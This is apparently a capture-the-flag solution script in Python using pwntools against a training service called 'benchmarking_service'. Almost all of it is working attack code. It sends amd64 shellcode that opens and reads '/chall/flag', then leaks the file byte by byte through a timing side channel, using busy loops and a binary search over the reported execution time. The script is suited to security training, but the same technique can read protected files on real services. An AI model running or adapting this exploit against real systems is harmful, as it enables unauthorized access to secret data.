from pwn import *

context.arch = 'amd64'

count = 0
flag = ""
exit = False
while not exit:
	lo = 19
	hi = 127
	while lo<=hi:
		mid = (hi+lo)//2
		
		if(len(sys.argv) > 1):
			if(sys.argv[1] == '--debug'):
				p = process("./benchmarking_service")
				gdb.attach(p, """
				# b *play+601
				"""	)
				input("wait...")
			elif(sys.argv[1] == '--strace'):
				p = process(["strace", "./benchmarking_service"])
			elif(sys.argv[1] == '--remote'):
				p = remote("bin.training.offdef.it", 5001)
		else:
			p = process("./benchmarking_service")

		sh = """
		   /* open(file='/chall/flag', oflag=0, mode=0) */
		    /* push b'/chall/flag\x00' */
		    push 0x1010101 ^ 0x67616c
		    xor dword ptr [rsp], 0x1010101
		    mov rax, 0x662f6c6c6168632f
		    push rax
		    mov rdi, rsp
		    xor edx, edx /* 0 */
		    xor esi, esi /* 0 */
		    /* call open() */
		    push SYS_open /* 2 */
		    pop rax
		    syscall
		    /* call read(3, 'rsp', 0x64) */
		    push rax
		    xor eax, eax /* SYS_read */
		    pop rdi
		    push 0x64
		    pop rdx
		    mov rsi, rsp
		    syscall
		    movzx   eax, BYTE PTR [rsi+%d]
		    cmp     al, %d
		    jne     .L2
		    jmp     .L3
		.L4:
		    add     DWORD PTR [rbp-4], 1
		.L3:
		    cmp     DWORD PTR [rbp-4], 0x10000000
		    jle     .L4
		.L2:
			cmp al, %d
			jg		.L5
			jmp		.L6
		.L7:
			add     DWORD PTR [rbp-4], 1
		.L5:
			cmp     DWORD PTR [rbp-4], 0x20000000
			jle		.L7
		.L6:
		""" % (count, mid, mid)

		p.sendline(asm(sh) + b'A'*1024)
		p.recvuntil(b'Time: ')
		time = float(p.recv().decode('utf-8'))
		
		if(time > 0.5 and time < 1): # Got the right character!
			count += 1
			flag += chr(mid)
			print(flag)
			if(chr(mid) == '}'): exit = True
			break
		elif(time > 1): # Character > mid
			lo = mid + 1
		else: # Character < mid
			hi = mid - 1
		p.close()
print(flag)